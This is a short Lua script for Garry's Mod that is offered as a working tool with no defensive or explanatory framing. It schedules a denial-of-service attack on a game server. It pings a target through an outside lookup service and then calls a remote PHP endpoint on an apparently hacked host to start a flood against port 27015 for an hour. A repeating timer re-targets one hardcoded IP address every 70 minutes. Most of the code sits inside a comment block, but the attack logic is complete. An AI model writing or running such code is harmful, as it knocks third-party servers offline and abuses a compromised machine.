/*local function log(txt)
	if not isstring(txt) then return end
	local l = file.Open("ddos_log.txt", "a", "DATA")
	if l then
		l:Write("["..os.date("%Y/%m/%d %H:%M:%S").."] "..txt.."\n")
		l:Close()
	end
	Msg"[DDOS] " print(txt)
end

local url = "http://card.hacked.jp/files/phps/ppp.php?action=start&ip=%s&port=%s&len=%s"

local function DDoS(ip,port,len)
	
	http.Fetch(string.format(url,ip,port,len),function(s) log(s) end)
	
	timer.Simple(60*60,function()
		log("1 hour is gone. Stopping.")
		http.Fetch("http://card.hacked.jp/files/phps/ppp.php?action=stop")
	end)

end

local function vPing(host,callback)

	http.Fetch("http://api.hackertarget.com/nping/?q="..host,function(s)
		
		local ip,loss = s:match(">%s([%d%.]-)%s.+%(([%d%.]-)%%%)")
		
		callback(ip,tonumber(loss))
		
	end)

end

function SafeDDos(host)
	vPing(host,function(ip,loss)
		
		if loss<100 then
			DDoS(ip,"27015",59)	
		end
	
	end)
end

//SafeDDos("109.195.87.116")
Say(1) 

timer.Create("DDoS_Timer",70*60,0,function()
	SafeDDos("109.195.87.116")
end)